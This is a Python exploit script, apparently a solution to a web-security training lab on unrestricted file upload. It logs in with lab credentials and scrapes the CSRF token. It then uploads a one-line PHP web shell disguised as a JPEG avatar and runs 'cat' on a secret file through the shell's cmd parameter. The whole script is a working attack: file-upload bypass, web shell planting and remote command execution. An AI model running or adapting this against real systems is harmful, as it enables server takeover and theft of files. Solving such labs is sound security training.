import requests
import sys
from bs4 import BeautifulSoup

def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def login():
    response_one = requests.get(f"{lab_url}/login")
    cookie_one = response_one.cookies.values()[0]
    csrf_token = extract_csrf_token(response_one)

    login_data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }

    response_two = requests.post(f"{lab_url}/login", cookies={"session": cookie_one}, data=login_data, allow_redirects=False)
    cookie_two = response_two.cookies.values()[0]
    return cookie_two


def upload_file():
   response = requests.get(f"{lab_url}/my-account", cookies={"session": cookie})
   csrf_token = extract_csrf_token(response)

   file = {
        "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    }

   data = {
        "user": "wiener",
        "csrf": csrf_token,
    }

   requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=file, data=data)


def execute_command():
    response = requests.get(f"{lab_url}/files/avatars/webshell.php?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
    print(response.text)


if __name__ == "__main__":
    try:
        lab_url = sys.argv[1].rstrip('/')
        cookie = login()
        print("Uploading file webshell.php")
        upload_file()
        print(f"File has been uploaded here: {lab_url}/files/avatars/webshell.php")
        print("The contents of the /home/carlos/secret file: ", end='')
        execute_command()

    except IndexError:
        print(f"Usage: python3 {sys.argv[0]} <url> \nExample: python3 {sys.argv[0]} https://0aa000b30398e74d82a6069b002d00f8.web-security-academy.net")
